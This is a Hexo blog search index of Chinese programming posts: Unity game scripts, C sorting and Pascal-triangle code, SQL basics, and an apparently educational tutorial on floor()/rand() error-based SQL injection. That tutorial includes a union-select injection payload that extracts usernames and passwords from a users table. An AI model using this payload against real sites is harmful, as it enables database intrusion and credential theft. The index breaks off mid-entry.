<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>选择排序对10个整数进行排序</title>
      <link href="/Unity%E5%BC%80%E5%8F%91/"/>
      <url>/Unity%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Unity小球吃金币实例"><a href="#一、Unity小球吃金币实例" class="headerlink" title="一、Unity小球吃金币实例"></a>一、Unity小球吃金币实例</h2><h3 id="1-创建小球移动脚本"><a href="#1-创建小球移动脚本" class="headerlink" title="1.创建小球移动脚本"></a>1.创建小球移动脚本</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">float</span> h = Input.GetAxis(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line"><span class="built_in">float</span> v = Input.GetAxis(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line">rb.AddForce(<span class="keyword">new</span> Vector3(h, <span class="number">0</span>, v));</span><br></pre></td></tr></table></figure><h3 id="2-摄像机跟随"><a href="#2-摄像机跟随" class="headerlink" title="2.摄像机跟随"></a>2.摄像机跟随</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FollowTarget</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Transform playerTransform;</span><br><span class="line">    <span class="keyword">private</span> Vector3 offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">       offset = transform.position - playerTransform.position;</span><br><span class="line">        <span class="comment">//相机位置-小球位置赋值给offset</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        transform.position = offset + playerTransform.position;</span><br><span class="line">        <span class="comment">//offset位置+玩家位置赋值给摄像机位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-物体碰到指定标签物体，销毁标签物体（碰撞检测）"><a href="#3-物体碰到指定标签物体，销毁标签物体（碰撞检测）" class="headerlink" title="3.物体碰到指定标签物体，销毁标签物体（碰撞检测）"></a>3.物体碰到指定标签物体，销毁标签物体（碰撞检测）</h3><p><em>OnTriggerEnter(){}<em>碰撞体进入其他</em>Trigger</em>触发器的时候被调用</p><p><em>OnTriggerStay(){}<em>碰撞体保持在其他</em>Trigger</em>触发器的时候每帧调用一次</p><p>OnTriggerExit(){}碰撞体退出Trigger触发器的时候被调用</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnCollisionEnter</span>(<span class="params">Collision collision</span>)<span class="comment">//系统方法</span></span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    Debug.Log(<span class="string">&quot;发生碰撞&quot;</span>);</span><br><span class="line">    <span class="comment">//Collision是用来刚体的碰撞，而Collider是用来碰撞器的碰撞</span></span><br><span class="line">    <span class="comment">//Colliedr是被碰物体的组件类似rigidbody组件，collision.colliedr.tag == &quot;Food&quot;也行</span></span><br><span class="line">    <span class="keyword">if</span> (collision.gameObject.tag == <span class="string">&quot;Food&quot;</span>)<span class="comment">//判断碰撞的物体标签是否为Food</span></span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(collision.gameObject);<span class="comment">//销毁碰撞的物体</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnCollisionExit</span>(<span class="params">Collision collision</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     Debug.Log(<span class="string">&quot;likai&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnCollisionStay</span>(<span class="params">Collision collision</span>)</span></span><br><span class="line"> &#123;</span><br><span class="line">    Debug.Log(<span class="string">&quot;保持时间&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="4-检测碰撞"><a href="#4-检测碰撞" class="headerlink" title="4.检测碰撞"></a>4.检测碰撞</h3><p>创建好3D物体后，在BOX Collider组件里，勾选Is Trigger则变为检测器</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter</span>(<span class="params">Collider other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(<span class="string">&quot;OnTriggerEnter&quot;</span> + other.tag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerExit</span>(<span class="params">Collider other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(<span class="string">&quot;OnTriggerExit&quot;</span> + other.tag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerStay</span>(<span class="params">Collider other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(<span class="string">&quot;OnTriggerStay&quot;</span> + other.tag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter</span>(<span class="params">Collider other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (other.tag == <span class="string">&quot;Food&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(other.gameObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-创建画布设置文本ui"><a href="#5-创建画布设置文本ui" class="headerlink" title="5.创建画布设置文本ui"></a>5.创建画布设置文本ui</h3><p>在player.cs初始化score</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> score = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter</span>(<span class="params">Collider other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (other.tag == <span class="string">&quot;Food&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(other.gameObject);</span><br><span class="line">        score++;</span><br><span class="line"></span><br><span class="line">        scoreText.text = <span class="string">&quot;分数：&quot;</span>+ score;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (score == <span class="number">10</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            winText.SetActive(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-工程文件"><a href="#6-工程文件" class="headerlink" title="6.工程文件"></a>6.工程文件</h3><p>链接：<a href="https://pan.baidu.com/s/1MpOJ0MeBrI9MV9aCWgtwKQ?pwd=6fwf">https://pan.baidu.com/s/1MpOJ0MeBrI9MV9aCWgtwKQ?pwd=6fwf</a><br>提取码：6fwf</p><h2 id="二、Unity发射子弹破坏墙实例"><a href="#二、Unity发射子弹破坏墙实例" class="headerlink" title="二、Unity发射子弹破坏墙实例"></a>二、Unity发射子弹破坏墙实例</h2><h3 id="1-FixedUpdate"><a href="#1-FixedUpdate" class="headerlink" title="1.FixedUpdate"></a>1.FixedUpdate</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    Debug.Log(Time.deltaTime);<span class="comment">//上一帧到下一帧所需要的秒数</span></span><br><span class="line">    Debug.Log(<span class="string">&quot;FPS：&quot;</span> + <span class="number">1</span> / Time.deltaTime);<span class="comment">//游戏帧数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体秒数可以正在Edit -&gt;  Project Setting -&gt; Time -&gt; Fixed Timestep 设置秒数</p><h3 id="2-Translate"><a href="#2-Translate" class="headerlink" title="2.Translate"></a>2.Translate</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Debug.Log(&quot;FPS：&quot; + 1 / Time.deltaTime);</span></span><br><span class="line">  </span><br><span class="line">   <span class="built_in">float</span> h = Input.GetAxis(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line">    <span class="built_in">float</span> v = Input.GetAxis(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line"> transform.Translate(<span class="keyword">new</span> Vector3(h, v, <span class="number">0</span>)  * speed * Time.deltaTime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-按鼠标发射子弹"><a href="#3-按鼠标发射子弹" class="headerlink" title="3.按鼠标发射子弹"></a>3.按鼠标发射子弹</h3><p>Instantiat(),将物体实例化，即创建物体</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//input</span></span><br><span class="line">    <span class="keyword">if</span> (Input.GetMouseButtonDown(<span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      GameObject boll = GameObject.Instantiate(bollPrefabs, transform.position, transform.rotation);</span><br><span class="line">      Rigidbody rd =  boll.GetComponent&lt;Rigidbody&gt;();<span class="comment">//得到子弹的刚体组件</span></span><br><span class="line">        rd.AddForce(Vector3.forward * <span class="number">100</span>);</span><br><span class="line">        rd.velocity = Vector3.forward * <span class="number">30</span>;<span class="comment">//velocity是速度</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-工程文件"><a href="#4-工程文件" class="headerlink" title="4.工程文件"></a>4.工程文件</h3><p>链接：<a href="https://pan.baidu.com/s/1DPu3iC2o_DiUzqmvV9As8A?pwd=yxc5">https://pan.baidu.com/s/1DPu3iC2o_DiUzqmvV9As8A?pwd=yxc5</a><br>提取码：yxc5</p>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序</title>
      <link href="/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/a0b367d22870a4acce84498e45683eb.png" alt="a0b367d22870a4acce84498e45683eb"></p><p><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/image-20240303231159260.png" alt="image-20240303231159260"></p><p><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/image-20240303232306999.png" alt="image-20240303232306999"><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/image-20240303235155286.png" alt="image-20240303235155286"><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/image-20240304200747951.png" alt="image-20240304200747951"></p><p><img src="/./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/image-20240304200833309.png" alt="image-20240304200833309"></p>]]></content>
      
      
      <categories>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础（2）</title>
      <link href="/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/"/>
      <url>/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h2><h3 id="floor报错涉及到的函数"><a href="#floor报错涉及到的函数" class="headerlink" title="floor报错涉及到的函数"></a>floor报错涉及到的函数</h3><p><strong>rand()</strong> :随机返回0~1间的小数。</p><p><strong>floor()</strong> :小数向下取整。</p><p><strong>celiling()</strong> :向上取整数。</p><p><strong>concat_ws()</strong> : 将括号内数据用第一个字段连接起来。</p><p><strong>as</strong> : 别名</p><p><strong>count()</strong> :汇总统计数量</p><p><strong>limit</strong> :这里用于显示指定行数</p><p>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,username,&#x27;</span>:<span class="string">&#x27;password)form users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><h3 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h3><p><img src="/./SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/work1.png" alt="work1"></p><h3 id="concat-ws-函数"><a href="#concat-ws-函数" class="headerlink" title="concat_ws()函数"></a>concat_ws()函数</h3><p><img src="/./SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/work2.png" alt="work2"></p><h3 id="as别名，group-by分组，count-函数"><a href="#as别名，group-by分组，count-函数" class="headerlink" title="as别名，group by分组，count()函数"></a>as别名，group by分组，count()函数</h3><p><strong>group by</strong>分组用于后面统计数据</p><p>真正起作用的报错是**count()<strong>，利用</strong>count()**计算securiry-0 和 securiry-1 分别出现几次。</p><p><img src="/./SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/work3.png" alt="work3"></p><h3 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a><strong>报错原因</strong></h3><p><img src="/./SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/work4.png" alt="work4"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/./SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/work5.png" alt="work5"></p><p>当group_key不存在的时候，group跟rand说，你给的键值我这里没有，不能给你统计，现在我给你发一条指令，从这条指令起，下次你给我回复的我就当键值输入。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>选择排序对10个整数进行排序</title>
      <link href="/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%E5%AF%B910%E4%B8%AA%E6%95%B4%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/"/>
      <url>/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%E5%AF%B910%E4%B8%AA%E6%95%B4%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="选择排序对10个整数进行排序"><a href="#选择排序对10个整数进行排序" class="headerlink" title="选择排序对10个整数进行排序"></a>选择排序对10个整数进行排序</h2><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>3、5、9、2、8、4、1、10、7、6</p><p>最终结果：1、2、3、4、5、6、7、8、9、10</p><h3 id="选择排序是什么？"><a href="#选择排序是什么？" class="headerlink" title="选择排序是什么？"></a>选择排序是什么？</h3><p>第一次排序1、5、9、2、8、4、3、10、7、6</p><p>第二次排序1、2、9、5、8、4、3、10、7、6</p><p> ……</p><p>1、2、3、4、5、6、7、8、9、10</p><p>3、5、9、2、8、4、1、10、7、6</p><p>首先会对3进行标记，然后与5比较，与9比较，与2比较时大于2，然后标记从3转移到2，2跟后面的数依次比较，与1比较时小于1，然后给1一个标记，在与后面比较，最后发现1是最小的数，然后把1与第一个位置的数进行换位，接着从第二个数在进行选择排序。</p><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> number[<span class="number">10</span>] = &#123; <span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">6</span> &#125;;</span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//标记</span></span><br><span class="line"><span class="type">int</span> exchange = <span class="number">0</span>;<span class="comment">//交换</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, number[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag = i; <span class="comment">//首先把标记放在第一个位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)<span class="comment">//然后第一个数与第一个后面的数依次开始进行比较</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (number[flag]&gt;=number[j])<span class="comment">//如果标记的数大于比较的数，那比较数就被标记，接着继续往后继续比较。</span></span><br><span class="line">&#123;</span><br><span class="line">flag = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag != i)<span class="comment">//如果标记不在第一个位置，就把标记的数与第一个数的位置进行交换</span></span><br><span class="line">&#123;</span><br><span class="line">exchange = number[flag];</span><br><span class="line">number[flag] = number[i];</span><br><span class="line">number[i] = exchange;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是循环遍历结果</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,number[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 基础算法 </tag>
            
            <tag> 选择排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维数组输出杨辉三角</title>
      <link href="/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E8%BE%93%E5%87%BA%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/"/>
      <url>/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E8%BE%93%E5%87%BA%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/</url>
      
        <content type="html"><![CDATA[<h2 id="利用二维数组输出杨辉三角"><a href="#利用二维数组输出杨辉三角" class="headerlink" title="利用二维数组输出杨辉三角"></a>利用二维数组输出杨辉三角</h2><h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><p><img src="/./%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E8%BE%93%E5%87%BA%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/work2.png" alt="work2"></p><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p><img src="/./%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E8%BE%93%E5%87%BA%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/work1.png" alt="work1"></p><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>;  i &lt;<span class="number">10</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i][<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//第一列全是1</span></span><br><span class="line">a[i][i] = <span class="number">1</span>;<span class="comment">//每一列最后一行全是1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">10</span>; i++)<span class="comment">//也就是第三行开始，第三行第二个数 = 第二行第一个数+地二行第二个数，这里i=2因为第一二行全是1。</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j++)<span class="comment">//a[i][j]中，j是从0开始计数，所以第三行开始即i=2，因为第三行第三列在第一个for中被赋值为1，j&lt;i就限定为第三行第二列。</span></span><br><span class="line">&#123;</span><br><span class="line">a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>] + a[i - <span class="number">1</span>][j]; <span class="comment">//第三行第二个数 = 第二行第一个数 + 地二行第二个数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面这个for用来遍历数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; j++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,a[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//每打一行就要换行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 基础算法 </tag>
            
            <tag> 二维数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础(1)</title>
      <link href="/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="sql基本语句"><a href="#sql基本语句" class="headerlink" title="sql基本语句"></a>sql基本语句</h2><p>SQL（Structured Query Language）是用于操作关系数据库的标准语言。以下是一些基本的SQL语句：</p><p>创建表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    column3 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>插入数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, column3, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><p>查询数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>更新数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span 